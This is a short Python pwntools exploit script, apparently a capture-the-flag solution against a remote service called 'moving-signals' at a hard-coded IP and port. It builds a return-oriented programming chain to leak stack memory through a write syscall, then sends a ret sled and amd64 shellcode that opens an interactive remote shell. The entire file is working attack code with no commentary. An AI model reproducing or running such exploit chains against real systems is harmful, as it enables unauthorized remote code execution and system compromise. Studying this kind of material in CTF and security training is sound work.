from pwn import *
import time
context.arch = 'amd64'
#p = process("./moving-signals")
p = remote("185.172.165.118", 2525)

ret = 0x41017
pop_rax_ret = 0x41018
syscall = 0x41015

payload = b'A'*8
payload += p64(pop_rax_ret)
payload += p64(1)
payload += p64(syscall)

payload += p64(pop_rax_ret)
payload += p64(0)
payload += p64(syscall)


#gdb.attach(p)
p.send(payload)
leak = p.recv(0x1f4)


payload = b''

for i in range(62):
	print("%d "%i + hex(u64(leak[i*8:(i+1)*8])) )
	if i == 37:
		payload += leak[i*8:(i+1)*8]
		break
	payload += p64(ret)

payload += p64(ret) #38
payload += p64(ret) #39
payload += p64(ret) #40
payload += p64(ret) #41
payload += p64(ret)	#42
payload += p64(ret)	#43
payload += p64(ret)	#44
payload += p64(ret) #45
payload += b'\x00'
payload += asm(shellcraft.amd64.sh(),arch='amd64')
p.send(payload)
p.interactive()
